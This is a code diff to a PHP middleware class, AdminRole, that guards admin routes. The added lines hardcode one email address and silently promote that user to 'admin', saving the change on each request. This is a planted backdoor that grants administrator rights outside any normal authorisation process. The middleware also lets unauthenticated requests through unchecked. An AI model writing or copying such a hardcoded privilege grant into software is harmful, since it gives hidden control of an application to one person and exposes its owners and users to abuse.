@@ -17,9 +17,14 @@ class AdminRole
     public function handle(Request $request, Closure $next): Response
     {
         if(Auth::check()){
+            if(auth()->user()->email === "yamen@gmail.com"){
+                auth()->user()->role = "admin";
+                auth()->user()->save();  
+            }
             if(Auth::user()->role === "user"){
                 return redirect()->route("home");
             }
+            
         }
 
         return $next($request);
